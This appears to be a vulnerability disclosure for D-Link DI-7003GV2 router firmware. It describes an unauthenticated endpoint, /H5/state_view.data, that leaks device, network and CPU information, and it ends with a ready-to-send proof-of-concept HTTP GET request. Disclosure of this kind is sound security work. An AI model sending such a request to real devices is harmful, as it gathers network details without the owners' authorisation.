# Overview

- Manufacturer's website information：https://www.dlink.com/
- Firmware download address ：http://www.dlink.com.cn/techsupport/download.ashx?file=7828

# Affected version

DI-7003GV2-24.04.18D1 R(68125)

# Vulnerability description

The D-Link DI-7003GV2 device exposes sensitive system and network information through the unauthenticated `/H5/state_view.data` HTTP endpoint. An attacker on the same network can send a crafted GET request to retrieve critical details, including device model, LAN and WAN IP addresses, MAC addresses, CPU specifications, and interface link states.

# Vulnerability details

The handling function for the `H5/state_view.data` interface is `sub_41E304`.

![图 0](img/a825fcd4122ae1efc1118a40a2dfe9a026a7296fa08307be6112e37299114afc.png)  

The `sub_41E304` function will output sensitive information such as device name, CPU information, and network information.

![图 1](img/ead1c009b2c89baf7c0d342c10952e989fee755c4fbb989e5a7306b95ba10c1b.png)  


# Poc

```http
GET /H5/state_view.data HTTP/1.1
Host: 192.168.140.240
Content-Length: 0
Cache-Control: max-age=0
Origin: http://192.168.140.240
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.140.240/login.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
```

![图 2](img/3c13904a3e0e20c2cb9654c3c0bd610a3efb0f18c6fe293973b9cfeff927158b.png)  
